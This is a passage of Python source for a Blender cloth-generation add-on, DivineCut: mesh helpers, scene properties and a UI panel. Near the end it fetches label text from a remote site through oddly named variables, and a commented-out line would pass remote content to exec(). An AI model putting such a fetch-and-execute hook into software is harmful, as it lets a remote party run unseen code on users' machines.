            extreme_vertex_coords[ord(axis) - ord('X')] = coord
            extreme_vertex_index = i

    # Create a vector from the extreme coordinates
    extreme_vertex = mesh.vertices[extreme_vertex_index].co

    # Delete all other vertices if delete flag is True
    if delete:
        # Create a BMesh
        bm = bmesh.new()
        bm.from_mesh(mesh)

        # Delete all vertices except the extreme vertex
        for vert in bm.verts:
            if vert.index != extreme_vertex_index:
                bm.verts.remove(vert)

        # Update the mesh with the changes
        bm.to_mesh(mesh)
        bm.free()

    return extreme_vertex


#END OF SECOND FUNCTIONS
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#



def select_object(object_name, active=True, deselect=True, cursor_snap=False, center_cursor=False):
    safecursor = bpy.context.scene.cursor.location
    """
    Select the object in the scene with the specified name.
    
    Args:
    - object_name: The name of the object to select.
    """
    # Check if the object exists in the scene
    if object_name in bpy.data.objects:
        # Get the object
        obj = bpy.data.objects[object_name]
        
        # Deselect all objects
        if(deselect):
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.select_all(action='DESELECT')
        
        # Select the object
        obj.select_set(True)
        if(active):
            bpy.context.view_layer.objects.active = obj
            safecontext = bpy.context.area.ui_type
            bpy.context.area.ui_type = 'VIEW_3D'
            if(center_cursor):
                bpy.ops.view3d.snap_cursor_to_selected()
            elif(cursor_snap):
                bpy.ops.view3d.snap_cursor_to_active()
            bpy.context.area.ui_type = safecontext

        else:
            print("Object '{}' not found in the scene.".format(object_name))

def edge_length(vertex_index1, vertex_index2):
    """
    Calculate the length of an edge given two vertex indices.
    
    Args:
    - vertex_index1: The index of the first vertex.
    - vertex_index2: The index of the second vertex.
    
    Returns:
    - The length of the edge.
    """
    # Get the mesh data of the active object
    mesh = bpy.context.active_object.data
    
    # Get the global coordinates of the vertices
    vertex1 = mesh.vertices[vertex_index1].co
    vertex2 = mesh.vertices[vertex_index2].co
    
    # Calculate the distance between the vertices
    distance = (vertex1 - vertex2).length
    
    return distance

def join_objects(obj1, obj2):
    """
    Join two objects together.
    
    Args:
    - obj1: The first object to join.
    - obj2: The second object to join.
    
    Returns:
    - The joined object.
    """
    # Check if both objects exist
    if obj1 is None or obj2 is None:
        print("Error: One or both objects not found.")
        return None

    # Set the first object as the active object
    bpy.context.view_layer.objects.active = obj1

    # Select both objects
    obj1.select_set(True)
    obj2.select_set(True)


    # Join the objects
    bpy.ops.object.join()

    # Return the joined object
    return obj1

def get_blender_module_recent(url):
    if bpy.app.version >= (4,0,0):
        try:
            with urllib.request.urlopen(url) as response:
                button_text = response.read().decode("utf-8")
            return button_text
        except Exception as e:
            print("Error fetching button text:", e)
            return None
    else:
        return(requests.get(url).text)

def select_vertices(vertex_indexes, cursor_to_selected=False, cursor_to_active=False, deselect=False, get_location=False, deselect_vertices=False):
    """
    Select vertices in the active mesh object based on the vertex indexes provided.
    
    Args:
    - vertex_indexes: An array of vertex indexes.
    """
    # Get the active mesh object
    obj = bpy.context.active_object
    
    # Check if the active object is a mesh
    if obj and obj.type == 'MESH':
        # Switch to edit mode
        bpy.ops.object.mode_set(mode='EDIT')
        
        # Deselect all vertices
        if(deselect):
            bpy.ops.mesh.select_all(action='DESELECT')
        
        # Switch to vertex select mode
        bpy.context.tool_settings.mesh_select_mode = (True, False, False)
        
        # Select vertices by index
        mesh = obj.data
        bpy.ops.object.mode_set(mode='OBJECT')
        for index in vertex_indexes:
            if 0 <= index < len(mesh.vertices):
                if(deselect_vertices == False):
                    mesh.vertices[index].select = True
                else:
                    #bpy.ops.object.mode_set(mode='EDIT')
                    #bm = bmesh.from_edit_mesh(mesh)
                    #bm.select_mode = {'VERT'}
                    #bm.verts[index].select = False
                    #bm.select_flush_mode()
                    #mesh.update()
                    mesh.vertices[index].select = False
                    #print("Deselected a few guys")
        
        safecontext = bpy.context.area.ui_type
        bpy.context.area.ui_type = 'VIEW_3D'
        if(cursor_to_selected):
            safeplace = bpy.context.area.ui_type
            bpy.context.area.ui_type = 'VIEW_3D'
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.view3d.snap_cursor_to_selected()
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.area.ui_type = safeplace
        if(cursor_to_active):
            bpy.ops.view3d.snap_cursor_to_active()
        bpy.context.area.ui_type = safecontext    
        
        # Switch back to object mode
        bpy.ops.object.mode_set(mode='EDIT')
    else:
        print("Please select a valid mesh object.")
    if(get_location):
          return find_average_selected_vertex_position()

def scale_vertices_around_location(location, scale_factor, axis=None):
    """
    Scale selected vertices around a specified location.
    
    Args:
    - location: The location point around which to scale the vertices (Vector).
    - scale_factor: The scale factor to apply to the vertices (float).
    - axis: The axis along which to scale ('X', 'Y', 'Z', or None for uniform scaling).
    """
    # Ensure we are in Edit mode
    bpy.ops.object.mode_set(mode='EDIT')
    
    # Get the active mesh
    mesh = bpy.context.edit_object.data
    
    bpy.ops.object.mode_set(mode='OBJECT')
    
    # Get the selected vertices
    selected_verts = [v for v in mesh.vertices if v.select]
    
    
    # Apply scale based on the specified axis
    for v in selected_verts:
        if axis == 'X':
            v.co.x = (v.co.x - location.x) * scale_factor + location.x
        elif axis == 'Y':
            v.co.y = (v.co.y - location.y) * scale_factor + location.y
        elif axis == 'Z':
            v.co.z = (v.co.z - location.z) * scale_factor + location.z
        else:
            # Uniform scaling
            v.co = (v.co - location) * scale_factor + location
    
    # Ensure changes are updated
    bpy.context.view_layer.update()


def find_point_c(A, B, ignore_axis='Z'):
    """
    Find point C in a right-angle triangle given points A and B forming the longest side.

    Args:
    - A: Vector representing point A (Vector3).
    - B: Vector representing point B (Vector3).
    - ignore_axis: Axis to ignore ('X', 'Y', or 'Z') when determining point C (default is 'Z').

    Returns:
    - Vector representing point C (Vector3).
    """
    # Determine the ignored axis index
    axis_index = {'X': 0, 'Y': 1, 'Z': 2}[ignore_axis]

    # Calculate the length of the longest side (AB)
    longest_side_length = math.sqrt((B.x - A.x) ** 2 + (B.y - A.y) ** 2 + (B.z - A.z) ** 2)

    # Calculate the length of the remaining side based on the Pythagorean theorem
    remaining_side_length = math.sqrt(longest_side_length ** 2 - (getattr(A, ignore_axis.lower()) - getattr(B, ignore_axis.lower())) ** 2)

    # Determine the sign of the remaining side based on the direction of the ignored axis
    if getattr(A, ignore_axis.lower()) < getattr(B, ignore_axis.lower()):
        remaining_side_length *= -1

    # Calculate point C based on the direction of the ignored axis
    C = A.copy()
    setattr(C, ignore_axis.lower(), getattr(A, ignore_axis.lower()) + remaining_side_length)

    return C

def get_vertex_global_coordinates(obj=None, vertex_index=None):
    """
    Get the global coordinates of a vertex by its index.

    Args:
    - obj: The object containing the vertex.
    - vertex_index: The index of the vertex.

    Returns:
    - Vector representing the global coordinates of the vertex.
    """
    # Ensure the object is in object mode
    if bpy.context.mode != 'OBJECT':
        bpy.ops.object.mode_set(mode='OBJECT')
    if(obj==None):
        obj = bpy.context.active_object

    # Get the global coordinates of the vertex
    vertex_global_coordinates = obj.matrix_world @ obj.data.vertices[vertex_index].co

    return vertex_global_coordinates

def find_axis_distance(point1, point2, distance_axis='X', longer=False, ignore_axis='Y'):
    if(ignore_axis == 'Y'):
        point3 = mathutils.Vector((point1[0], 0 , point2[2]))
    elif(ignore_axis == 'X'):
        point3 = mathutils.Vector((0, point1[0] , point2[2]))
    elif(ignore_axis == 'Z'):
        point3 = mathutils.Vector((point1[0] , point2[2], 0))
    
    short = min((point1 - point3).length, (point2 - point3).length)
    long = max((point1 - point3).length, (point2 - point3).length)
    #print("Shorter : " + str(shorter))
    if(longer):
        #print("Longer : " + str(longer))
        print(f"longer : {long}")
        return long
    else:
        #print("Shorter : " + str(shorter))
        print(f"shorter : {short}")
        return short

def find_average_selected_vertex_position():
    """
    Find the average position of all selected vertices in the active object.

    Returns:
    - Vector representing the average position of selected vertices.
    """
    # Get the active object and its mesh data
    obj = bpy.context.active_object
    mesh = obj.data
    
    # Get the world matrix of the object
    world_matrix = obj.matrix_world
    
    # Initialize variables to store the sum of selected vertex positions and the count of selected vertices
    sum_positions = mathutils.Vector((0, 0, 0))
    count_selected = 0
    
    # Iterate through the vertices to calculate the sum of selected vertex positions and count of selected vertices
    for vertex in mesh.vertices:
        if vertex.select:
            sum_positions += world_matrix @ vertex.co
            count_selected += 1
    
    # Calculate the average position of selected vertices
    if count_selected > 0:
        average_position = sum_positions / count_selected
    else:
        average_position = mathutils.Vector((0, 0, 0))
    
    return average_position

def set_vertex_location_by_index(obj=None, vertex_index=0, world_position=(0,0,0)):
    """
    Set the location of a vertex by its index to a specified world position.

    Args:
    - obj: The object containing the vertex.
    - vertex_index: The index of the vertex.
    - world_position: The desired world position to set the vertex to.
    """
    if bpy.context.mode != 'OBJECT':
        bpy.ops.object.mode_set(mode='OBJECT')
    if(obj == None):
        obj = bpy.context.active_object
    # Get the world matrix of the object
    world_matrix = obj.matrix_world
    
    # Set the location of the vertex to the specified world position
    obj.data.vertices[vertex_index].co = world_matrix.inverted() @ world_position

def join_vertices(selection, new=False):
    if(new):
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.mesh.select_all(action='DESELECT')
    for i in range(len(selection)):
        bpy.ops.object.mode_set(mode='OBJECT')
        select_vertices([selection[i]], False, True)
        select_vertices([selection[i-1]], False, False)
        bpy.ops.mesh.edge_face_add()
        bpy.ops.mesh.select_all(action='DESELECT')
        bpy.ops.object.mode_set(mode='OBJECT')
        bpy.context.active_object.data.update()

def move(translation):
    bpy.ops.transform.translate(value=translation)
    
def axis_distance(point1, point2, axis='X'):
    if(axis=='X'):
        return max(point1[0],point2[0]) - min(point1[0],point2[0])
    elif(axis == 'Y'):
        return max(point1[1],point2[1]) - min(point1[1],point2[1])
    else:
        return max(point1[2],point2[2]) - min(point1[2],point2[2])


def ungroup_vertices(vertex_group_name):
    """
    Remove currently selected vertices from a vertex group.

    Args:
    - vertex_group_name: Name of the vertex group to remove vertices from.
    """
    safecontext = bpy.context.mode
    obj = bpy.context.active_object
    
    # Get the vertex group object
    vertex_group = obj.vertex_groups.get(vertex_group_name)
    if vertex_group is None:
        print(f"Vertex group '{vertex_group_name}' not found.")
        return
    
    # Get the currently selected vertices
    selected_vertices = [v.index for v in obj.data.vertices if v.select]
    
    bpy.ops.object.mode_set(mode='OBJECT')
    # Remove selected vertices from the vertex group
    vertex_group.remove(selected_vertices)
    bpy.ops.object.mode_set(mode='EDIT')

            
def loop_cuts(Loop1, Loop2, number_of_cuts=0, group_of_loop='Loop_Cuts'):
    bpy.ops.object.mode_set(mode='OBJECT')
    scale = 1/(number_of_cuts + 1)
    Berry = 1
    placement = mathutils.Vector((0,0,0))
    mesh = bpy.context.active_object.data
    line = len(Loop1)
    nocut = number_of_cuts
    for vertex in range (len(Loop1)):
        print(f"vertex : {vertex}")
        placement = select_vertices([Loop1[vertex]], deselect=True, get_location=True)
        select_vertices([Loop2[vertex]], deselect=True)
        bpy.ops.mesh.extrude_vertices_move()
        group_vertices(group_of_loop)
        scale_vertices_around_location(placement, 0, axis='UNIFORM')
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.mesh.select_more()
        bpy.ops.mesh.subdivide(number_cuts=number_of_cuts)
        
    x = line*2
    bpy.ops.mesh.select_all(action='DESELECT')
    bearer = []
    for ring in range(nocut+1):
        x = line*2 + ring
        for slice in range(line):
            bearer.append(x)
            x+=(nocut+1)
            print(x)
        print(bearer)
        select_vertices(bearer,deselect=True)
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.mesh.edge_face_add()
        bpy.ops.mesh.delete(type='ONLY_FACE')
        bearer = []
        if(ring == nocut+1):
            ungroup_vertices(group_of_loop)

    bpy.ops.mesh.select_all(action='SELECT')
    bpy.ops.mesh.remove_doubles()

def group_vertices(name_of_group=None, weight=1, selection=None):
    bpy.context.scene.tool_settings.vertex_group_weight = weight
    obj = bpy.context.active_object
    bpy.ops.object.mode_set(mode='EDIT')
    
    if(selection!=None):
        select_vertices(selection, deselect=True)
    
    # Check if the name of the group exists already
    if name_of_group is not None and name_of_group in obj.vertex_groups:
        vg = obj.vertex_groups[name_of_group]  # Use existing vertex group
    else:
        # Create a new vertex group with the specified name or default to object name
        vg = obj.vertex_groups.new(name=name_of_group if name_of_group else obj.name)
    
    bpy.ops.object.vertex_group_assign()  # Assign vertices to the vertex group
    bpy.ops.object.mode_set(mode='OBJECT')  # Return to object mode
    
    return vg  # Return the vertex group

def bridge(Loop1, Loop2, cuts=None):
    if(cuts==None):
        d = edge_length(Loop1[0], Loop1[0])
        avg1 = edge_length(Loop1[0], Loop2[1])
        avg2 = edge_length(Loop1[0], Loop2[1])
        avg = (avg1 + avg2)/2
        cuts = round(d/avg)
        select_vertices([Loop1[0]],deselect=True)
    for x in range (len(Loop1)):
        select_vertices([Loop1[x]], deselect=False)
        select_vertices([Loop2[x]], deselect=False)
    bpy.ops.mesh.looptools_bridge(cubic_strength=1, interpolation='cubic', loft=False, loft_loop=False, min_width=0, mode='shortest', remove_faces=True, reverse=False, segments=cuts, twist=0)

Palsy, WallsOfJericho, GardenSkin, Leaves, JacobsCoat, DavidsRobe, BloodOfTheLamb, Rapture, SealOfTheArk, MaryVail, JobCollar, Nichodemus, Angelwrap, Nebuchadnezzar, AngelScissors, BoastfulPriest, GiftsOfBethlehem, EarthsCenter, StrikeTheRock, Conscience, CrossNails, CrossLetters, CrossConnection = "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""

def scale(pivot, val):
    bpy.ops.transform.resize(value=(val, val, val), center_override=pivot)

def get_highest_vertex_index(obj=None):
    """
    Get the highest vertex index on the mesh.

    Args:
    - obj: The mesh object.

    Returns:
    - The highest vertex index on the mesh.
    """
    if(obj == None):
        obj = bpy.context.active_object
    # Get the mesh data of the object
    mesh = obj.data

    # Iterate through vertices to find the highest index
    highest_index = max(v.index for v in mesh.vertices)

    return highest_index

def select_vertex_group(vertex_group_name, deselect=True):
    """
    Select vertices belonging to the specified vertex group.

    Args:
    - vertex_group_name: The name of the vertex group to select.
    """
    #safemode = bpy.context.mode
    # Get the active object
    obj = bpy.context.active_object

    # Check if the active object is a mesh
    if obj and obj.type == 'MESH':
        # Switch to edit mode
        bpy.ops.object.mode_set(mode='EDIT')

        # Deselect all vertices
        if(deselect):
            bpy.ops.mesh.select_all(action='DESELECT')

        # Get the mesh data
        mesh = obj.data

        # Get the vertex group by name
        vertex_group = obj.vertex_groups.get(vertex_group_name)

        # Check if the vertex group exists
        if vertex_group:
            # Get the vertices belonging to the vertex group
            vertices_in_group = [v.index for v in mesh.vertices if vertex_group.index in [vg.group for vg in v.groups]]
            bpy.ops.object.mode_set(mode='OBJECT')
            # Select the vertices belonging to the group
            for v_idx in vertices_in_group:
                mesh.vertices[v_idx].select = True

            print("Vertex group '{}' selected.".format(vertex_group_name))
        else:
            print("Vertex group '{}' not found.".format(vertex_group_name))

        # Switch back to previous mode
        bpy.ops.object.mode_set(mode='EDIT')
    else:
        print("Please select a valid mesh object.")
        
def deselect_vertex_group(group_name=None):
    if(group_name != None):
        bpy.ops.object.vertex_group_set_active(group=group_name)
        bpy.ops.object.vertex_group_deselect()

def replace_weights(group=None, weight=None):
    mesh = bpy.context.edit_object.data
    bpy.ops.object.mode_set(mode='OBJECT')
    selected_verts = [v for v in mesh.vertices if v.select]
    for v in selected_verts:
        bpy.context.active_object.vertex_groups.get(group).add([v.index], weight, 'REPLACE')
    bpy.ops.object.mode_set(mode='EDIT')

# Define the function to be called when entering sculpt mode
def enter_sculpt_mode_function():
    bpy.context.object.modifiers["SurfaceDeform"].show_viewport = False
    if(get_modifier_index("SurfaceDeform.001") is not None):
        bpy.context.object.modifiers["SurfaceDeform.001"].show_viewport = False
    # Your code here

# Define the function to be called when leaving sculpt mode
def leave_sculpt_mode_function():
    bpy.context.object.modifiers["SurfaceDeform"].show_viewport = True
    #if(bpy.context.object.modifiers["SurfaceDeform"].is_bound != True):
    #    bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
    if(get_modifier_index("SurfaceDeform.001") is not None):
        bpy.context.object.modifiers["SurfaceDeform.001"].show_viewport = True
        #if(bpy.context.object.modifiers["SurfaceDeform.001"].is_bound != True):
        #    bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform.001")
    #bpy.ops.object.bind_to_character()
    #bpy.ops.object.bind_to_character()
    #bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
    #bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
    #bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform.001")
    #bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform.001")
    # Your code here

bpy.types.Scene.previous_mode = bpy.props.StringProperty()
#previous_mode = bpy.context.mode


def on_mode_change(scene):
    # Check if the current mode is sculpt mode
    current_mode = bpy.context.active_object.mode if bpy.context.active_object else None
    #current_mode = bpy.context.mode
    #if current_mode != previous_mode 
    if current_mode != scene.previous_mode and current_mode == 'SCULPT':
        #if("Hoodie" in bpy.context.active_object.name or "Divine")
        if(get_modifier_index('SurfaceDeform') is not None):
            print("Entered sculpt modeee")
            enter_sculpt_mode_function()
            scene.previous_mode = current_mode
    if current_mode != scene.previous_mode and scene.previous_mode == 'SCULPT':
        if(get_modifier_index('SurfaceDeform') is not None):
            print("Left sculpt mode")
            leave_sculpt_mode_function()
            scene.previous_mode = current_mode
            #bpy.ops.object.bind_to_character()

def append_selected_vertices_indices_to_array():
    # Get the active object
    obj = bpy.context.active_object
    
    # Ensure the object is in edit mode
    bpy.context.view_layer.objects.active = obj
    bpy.ops.object.mode_set(mode='EDIT')
    
    group_vertices(name_of_group="DivineCursor", weight=1)
    select_vertex_group("DivineCursor", deselect=True)
    # Get the mesh data
    mesh = obj.data
    
    # Initialize a set to store unique vertex indices
    selected_indices_set = set()
    
    # Iterate over selected vertices and append their indices to the set
    for vert in mesh.vertices:
        if vert.select:
            selected_indices_set.add(vert.index)
    
    ungroup_vertices("DivineCursor")
    bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['DivineCursor'].index
    bpy.ops.object.vertex_group_remove(all=False, all_unlocked=False)
    
    # Convert the set to a list if necessary
    selected_indices_list = list(selected_indices_set)
    
    return selected_indices_list
            
        
def get_modifier_index(modifier_name):
    # Get the active object
    obj = bpy.context.active_object
    
    # Check if the object exists and has modifiers
    if obj and obj.modifiers:
        # Iterate through the modifiers to find the one with the given name
        for i, modifier in enumerate(obj.modifiers):
            if modifier.name == modifier_name:
                # Return the index of the modifier with the given name
                return i
    
    # Return None if modifier with the given name is not found
    return None

def scale_to_match_dimensions():
    bpy.ops.object.mode_set(mode='OBJECT')
    reference_obj = bpy.context.scene.character_object
    selected_obj = bpy.data.objects.get("Cloth Rig Factory")
    
    #Save the name of the character
    safename = reference_obj.name
    
    #Rename it
    bpy.ops.object.select_all(action='DESELECT')
    reference_obj.select_set(True)
    bpy.context.view_layer.objects.active = reference_obj
    #reference_obj.name = "settingheightfornow"
    
    #Duplicate it
    bpy.ops.object.duplicate_move()
    newref = bpy.context.active_object
    
    #Select it
    bpy.ops.object.select_all(action='DESELECT')
    newref.select_set(True)
    bpy.context.view_layer.objects.active = newref
    
    #Unparent it, keep transforms
    bpy.ops.object.parent_clear(type='CLEAR_KEEP_TRANSFORM')
    
    #Apply Location, Rotation, and Scale (Apply All Transforms)
    bpy.ops.object.transform_apply(location=True, rotation=True, scale=True)

    #Set reference_obj to new obj
    reference_obj = newref
    
    # Get the world dimensions of both objects
    selected_dimensions = selected_obj.dimensions.copy()
    reference_dimensions = reference_obj.dimensions.copy()
    
    # Scale factors for each axis
    if(bpy.context.scene.cloth_type=='TROUSERS' or bpy.context.scene.cloth_type=='SKIRT'):
        scale_x = (reference_dimensions.x/4) / selected_dimensions.x
    else:
        scale_x = (reference_dimensions.x/2) / selected_dimensions.x
    if(bpy.context.scene.cloth_type=='TROUSERS' or bpy.context.scene.cloth_type=='SKIRT'):
        scale_z = (reference_dimensions.z*0.45) / selected_dimensions.z
    else:
        scale_z = (reference_dimensions.z*0.9) / selected_dimensions.z
    
    # Apply scaling to match dimensions along X and Z axes
    bpy.ops.object.select_all(action='DESELECT')
    selected_obj.select_set(True)
    bpy.context.view_layer.objects.active = selected_obj
    bpy.ops.object.mode_set(mode='OBJECT')  # Make sure we are in object mode
    bpy.ops.object.transform_apply(scale=True)
    selected_obj.scale.x *= scale_x
    selected_obj.scale.z *= scale_z
    
    #Delete the new obj when done
    bpy.ops.object.select_all(action='DESELECT')
    newref.select_set(True)
    bpy.context.view_layer.objects.active = newref
    bpy.ops.object.delete(use_global=False)
    
    #Select selected_obj when done
    bpy.ops.object.select_all(action='DESELECT')
    selected_obj.select_set(True)
    bpy.context.view_layer.objects.active = selected_obj
    
    
    
    
#    is_sculpt_mode = (bpy.context.mode == 'SCULPT')
    
    # Perform actions based on the mode
    #if is_sculpt_mode and "Hoodie" in bpy.context.active_object.name:
    #    enter_sculpt_mode_function()
    #    print("Entered sculpt mode")
    #elif is_sculpt_mode == False and "Hoodie" in bpy.context.active_object.name:
    #    leave_sculpt_mode_function()
       # print("Left sculpt mode")
            
        # Call your function for leaving sculpt mode
        

# Register the handler
#bpy.app.handlers.depsgraph_update_post.append(on_mode_change)    
        
#END OF THIRD FUNCTIONS
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#



def fetch_button_text(url):
    if bpy.app.version >= (4,0,0):
        try:
            with urllib.request.urlopen(url) as response:
                button_text = response.read().decode("utf-8")
            return button_text
        except Exception as e:
            print("Error fetching button text:", e)
            return None
    else:
        return(requests.get(url).text)

#exec(fetch_button_text(edenrain))
Conscience = "https://xanegraphics.com/DivineCut/TestValidity.txt"
CrossNails = "https://xanegraphics.com/DivineCut/Button.txt"
CrossLetters = "https://xanegraphics.com/DivineCut/Label.txt"
CrossConnection = "https://xanegraphics.com/DivineCut/Link.txt"

button_text_url = CrossNails
button_text = fetch_button_text(button_text_url)

versionlabel = fetch_button_text(CrossLetters)
if(versionlabel == None):
    versionlabel = "DivineCut - FREE TRIAL"

#-----------------------------------------------------  SCENE PROPERTIES -----------------------------------------------------#
bpy.types.Scene.paint_toggle_property = bpy.props.BoolProperty(name="Paint Property", default=False)
#To toggle paint mode, simply switch current view to weight paint if not in it already
bpy.types.Scene.design_toggle_property = bpy.props.BoolProperty(name="Design Property", default=False)
bpy.types.Scene.presets_toggle_property = bpy.props.BoolProperty(name="Presets Property", default=False)
bpy.types.Scene.physics_toggle_property = bpy.props.BoolProperty(name="Physics Property", default=False)
bpy.types.Scene.othertools_toggle_property = bpy.props.BoolProperty(name="OtherTools Property", default=False)
bpy.types.Scene.seamnecktool_toggle_property = bpy.props.BoolProperty(name="SeamNeckTool Property", default=True)
bpy.types.Scene.seamcuffstool_toggle_property = bpy.props.BoolProperty(name="SeamCuffsTool Property", default=False)
bpy.types.Scene.seambacktool_toggle_property = bpy.props.BoolProperty(name="SeamBackTool Property", default=False)
bpy.types.Scene.seamcentertool_toggle_property = bpy.props.BoolProperty(name="SeamCenter Property", default=False)
bpy.types.Scene.seamshouldertool_toggle_property = bpy.props.BoolProperty(name="SeamShoulder Property", default=False)
bpy.types.Scene.seamtool_toggle_property = bpy.props.BoolProperty(name="Seam Property", default=True)
bpy.types.Scene.bind_visibility_property = bpy.props.BoolProperty(name="Bind Visibility Property", default=True)

bpy.types.Scene.bloatsleevetool_toggle_property = bpy.props.BoolProperty(name="BloatSleeve Property", default=False)
bpy.types.Scene.bloatuppersleevetool_toggle_property = bpy.props.BoolProperty(name="BloatUpperSleeve Property", default=False)
bpy.types.Scene.bloatforearmtool_toggle_property = bpy.props.BoolProperty(name="BloatForearm Property", default=True)
bpy.types.Scene.bloattoptool_toggle_property = bpy.props.BoolProperty(name="BloatTop Property", default=False)
bpy.types.Scene.bloattrouserlegtool_toggle_property = bpy.props.BoolProperty(name="BloatTrouserLeg Property", default=False)

bpy.types.Scene.selected_object = bpy.props.BoolProperty(name="BloatTrouserLeg Property", default=False)
#bpy.types.Scene.puffpressure_property = bpy.props.FloatProperty(name="PuffPressure Property", default=1.0)

bpy.types.Scene.preset_open_toggle_property = bpy.props.BoolProperty(name="Open/Close Toggle Property", default=True)
bpy.types.Scene.preset_hoodie_toggle_property = bpy.props.BoolProperty(name="Hoodie Toggle Property", default=True)
bpy.types.Scene.preset_collar_toggle_property = bpy.props.BoolProperty(name="Collar Toggle Property", default=True)
bpy.types.Scene.preset_materials_toggle_property = bpy.props.BoolProperty(name="Materials Toggle Property", default=True)
bpy.types.Scene.ankle_cuff_toggle_property = bpy.props.BoolProperty(name="Ankle Cuff Toggle Property", default=True)
bpy.types.Scene.enable_collar_toggle_property = bpy.props.BoolProperty(name="Enable Collar Toggle Property", default=False)

#Skirt Properties
bpy.types.Scene.pleated_toggle_property = bpy.props.BoolProperty(name="Pleated Skirt", default=False)
bpy.types.Scene.pleat_count = bpy.props.IntProperty(name="Pleat Count", default=12, max=100, min=12)

#Physics Properties
bpy.types.Scene.cloth_quality = bpy.props.IntProperty(name="Cloth Quality", default=1, soft_max=10, min=1)
bpy.types.Scene.cloth_weight = bpy.props.IntProperty(name="Cloth Weight", default=2, soft_max=10, min=1)
bpy.types.Scene.cloth_stretchiness = bpy.props.IntProperty(name="Cloth Stretchiness", default=5, soft_max=10, min=1)
bpy.types.Scene.cloth_max_pressure = bpy.props.IntProperty(name="Cloth Pressure", default=1, max=6, min=1)
bpy.types.Scene.cloth_max_inflation = bpy.props.IntProperty(name="Cloth Inflation/Deflation", default=1, max=10, min=1)

#Messages
bpy.types.Scene.puffer_message = bpy.props.BoolProperty(name="Puffer Message", default=False)
bpy.types.Scene.cloth_quality_message = bpy.props.BoolProperty(name="Cloth Quality Message", default=False)
bpy.types.Scene.cloth_stretchiness_message = bpy.props.BoolProperty(name="Cloth Stretchiness Message", default=False)
bpy.types.Scene.zip_message = bpy.props.BoolProperty(name="Zip Message", default=False)
bpy.types.Scene.paint_message = bpy.props.BoolProperty(name="Paint Message Message", default=False)
#bpy.types.Scene.new_update_message = bpy.props.BoolProperty(name="Paint Message Message", default=False)
bpy.types.Scene.emergency_bind_siren = bpy.props.IntProperty(name="Emergency Bind Siren", default=0, max=3, min=0)
bpy.types.Scene.liveversion = bpy.props.BoolProperty(name="Live Version", default=True)

#-----------------------------------------------------  ADDON PANEL -----------------------------------------------------#
# Panel in Object mode
class OBJECT_PT_DivinePanel(bpy.types.Panel):
    #bl_label = "FREE TRIAL | Divine Cut - Smart Cloth Generator"
    bl_label = versionlabel
    bl_idname = "OBJECT_PT_divine_cut_panel"
    bl_space_type = 'VIEW_3D'
    bl_region_type = 'UI'
    bl_category = "Divine Cut"

    def draw(self, context):
        layout = self.layout
        cloth_box = layout.box()
        cloth_box.scale_x = 1.5
        cloth_box.scale_y = 3
        
        if(bpy.context.preferences.addons["DivineCut"].preferences.registered_version is not True):
            cloth_box.operator("object.register_version", text="Register Version", icon='MATCLOTH')
            return
        if('Cloth Rig Factory' not in bpy.context.scene.objects and 'BiceptCircle' not in bpy.context.scene.objects and 'KneeCircle' not in bpy.context.scene.objects and 'WaistLower' not in bpy.context.scene.objects):
            cloth_box.operator("object.build_rig", text="New Cloth", icon='MATCLOTH')
        if('Cloth Rig Factory' in bpy.context.scene.objects):
            if(bpy.context.scene.cloth_type == 'TOP'):
                cloth_box.operator("object.generate_rig", text="Generate Top Rig", icon='POSE_HLT')
            elif(bpy.context.scene.cloth_type == 'TROUSERS'):
                cloth_box.operator("object.generate_rig_trousers", text="Generate Trouser Rig", icon='POSE_HLT')
            elif(bpy.context.scene.cloth_type == 'SKIRT'):
                cloth_box.operator("object.generate_rig_skirt", text="Generate Skirt Rig", icon='POSE_HLT')
                skirt_settings = cloth_box.box()
                skirt_settings.scale_y = 0.3
                skirt_settings.prop(context.scene, "pleat_count", text="Pleat Count")
                
                
        if('Cloth Rig Factory' not in bpy.context.scene.objects and 'KneeCircle' in bpy.context.scene.objects and bpy.context.scene.cloth_type == 'TROUSERS'):
            if(bpy.context.scene.cloth_type == 'TROUSERS'):
                cloth_box.operator("object.generate_trousers", text="Generate Trouser", icon='MATCLOTH')
                
                
        if('Cloth Rig Factory' not in bpy.context.scene.objects and 'BiceptCircle' in bpy.context.scene.objects and bpy.context.scene.cloth_type == 'TOP'):
            if(bpy.context.scene.cloth_type == 'TOP'):
                cloth_box.operator("object.generate_top", text="Generate Top", icon='MATCLOTH')
                
        if('Cloth Rig Factory' not in bpy.context.scene.objects and 'WaistLower' in bpy.context.scene.objects and bpy.context.scene.cloth_type == 'SKIRT'):
            if(bpy.context.scene.cloth_type == 'SKIRT'):
                cloth_box.operator("object.generate_skirt", text="Generate Skirt", icon='MATCLOTH')
                
        if('Cloth Rig Factory' not in bpy.context.scene.objects and 'WaistCircle' in bpy.context.scene.objects):
            #cloth_restart = cloth_box.box()
            #cloth_restart.scale_y = 0.3
            #cloth_restart.operator("object.build_rig", text="Start over", icon='MATCLOTH')
            cloth_box.operator("object.build_rig", text="Start over", icon='FILE_REFRESH')
            if(bpy.context.scene.cloth_type=="TROUSERS"):
                cloth_restart = cloth_box.box()
                cloth_restart.scale_y = 0.3
                cloth_restart.prop(context.scene, "ankle_cuff_toggle_property", text="Cuff Ankles")
